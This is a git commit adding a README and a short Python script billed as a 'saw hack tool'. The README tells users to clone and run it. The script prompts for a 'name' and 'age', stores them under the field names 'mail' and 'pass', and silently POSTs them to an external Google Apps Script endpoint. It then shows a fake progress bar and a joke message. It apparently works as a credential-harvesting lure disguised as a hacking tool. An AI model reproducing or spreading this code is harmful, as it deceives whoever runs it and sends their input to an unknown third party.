b0b0acad0bd62e64830f1b8959b769f71a139bd9
Love <78062729+love676@users.noreply.github.com>
2021-02-22 10:02:27 +0630

    Add files via upload

---
+++ README.md
@@ -0,0 +1,5 @@
+#sawhack
+<p>git clone https://github.com:love676/sawhack.git
+<p>cd sawhack
+<p>python sawhack.py
+
---
+++ sawhack.py
@@ -0,0 +1,18 @@
+import requests
+import pyfiglet
+import time
+a = pyfiglet.figlet_format('saw hack tool')
+print(a)
+print("......autor by: Love......")
+print(".....dont use illegal.....")
+print('........please enter you saw hack name \n and age........')
+
+umail =input("please Enter you hack saw name=")
+upass =input("please Enter  you hack saw age=")
+data ={'mail':umail,'pass':upass}
+print("plase wait")
+rq =requests.post('https://script.google.com/macros/s/AKfycbzpRqyHxvWSniIhc5UqBK-RJDz3gGCo4xYBlLwFkhAdNEsKLmI/exec',data=data)
+for i in range(100):
+   print(i,'%')
+   time.sleep(1)
+print('You can not be ugly')
